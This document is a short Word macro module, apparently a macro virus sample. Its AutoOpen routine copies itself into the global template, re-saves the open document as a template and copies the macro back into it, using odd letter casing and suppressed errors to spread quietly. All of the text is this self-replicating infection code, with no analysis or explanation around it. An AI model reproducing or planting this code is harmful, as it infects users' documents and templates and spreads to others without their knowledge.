   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AuToOpEn"

   Public Sub MAIN()
   Dim a_$
   Dim b$
   On Error GoTo -1: On Error GoTo A: a_$ = WordBasic.[FileName$]() + ":AuToOpEn"
   b$ = "Global:aUtOoPeN": WordBasic.MacroCopy a_$, b$
   A: On Error GoTo -1: On Error GoTo Z: WordBasic.FileSaveAs Format:=1: WordBasic.MacroCopy b$, a_$
   Z:
   End Sub
